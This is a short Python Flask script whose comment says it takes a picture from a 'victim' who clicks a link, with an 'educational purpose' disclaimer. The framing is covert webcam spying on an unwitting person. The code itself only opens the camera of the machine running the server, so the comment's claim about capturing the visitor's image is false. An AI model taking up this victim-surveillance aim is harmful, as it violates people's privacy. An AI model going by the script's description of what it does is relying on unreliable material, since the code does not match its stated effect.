#program to get picture from victim when link is clicked

#just for educational purpose

from flask import Flask
import cv2

app = Flask(__name__)

@app.route('/capture')
def capture():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite('captured_frame.png', frame)
        cap.release()
        return "Frame captured and saved as captured_frame.png"
    else:
        cap.release()
        return "Failed to capture frame"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
